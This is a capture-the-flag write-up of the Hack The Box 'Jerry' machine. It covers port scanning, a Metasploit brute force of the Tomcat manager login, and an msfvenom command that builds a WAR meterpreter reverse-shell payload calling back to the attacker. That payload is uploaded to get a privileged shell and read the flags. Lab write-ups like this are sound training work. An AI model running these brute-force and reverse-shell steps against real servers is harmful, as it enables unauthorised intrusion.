# Initial recon
---
As always i've started with nmap, and for my surprise, only a single port open

```bash
cha0s@vm:~/ctf/htb/jerry$ nmap -A -p- -T4 --min-rate=500 -Pn 10.10.10.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-02 11:19 -03

```

An apache tomcat instance, just like a "default installation"

# Tomcat enumeration

Without further thinking, i fired metasploit and runned the `auxiliary/scanner/http/tomcat_mgr_login` module

After a few minutes of bruteforce we found:
	`tomcat:s3cret`
Now we have a login for tomcat's manager gui. 
# Exploitation
--- 
Now, we need to get a shell. Since we already inside tomcat webapp as an admin, we can abuse the upload feature to upload an malicious .war file that will allow us to get a reverse shell.

First we create a .war payload using msfvenom. Apart from looking at the machine info and knowing its a windows, we could simply go at the "show status", page and figure out it's a windows server 2012 machine.

To create the payload we use:
`msfvenom -p windows/meterpreter/reverse_tcp lhost=<your Tun0> lport=4444 -f war -o xp.war`

Note that i've unziped the .war, that's because we won't get a shell by simply uploading, we also need to run the malicious jsp

Then, we can upload it on tomcat manager gui

_file uploaded successfully!_

Then visit the page with the file we early extracted

And, we get a shell!!!

# Post exploitation

After that we start to gather some information about the machine and for my surprise...

![[/assets/img/jerry/Pasted image 20240402114814.png]]

We are already the highest windows privileged account.

So i head to the administrator desktop (default location for flags)

![[/assets/img/jerry/Pasted image 20240402114857.png]]

And enjoy my 2 flags for the price of one üòã
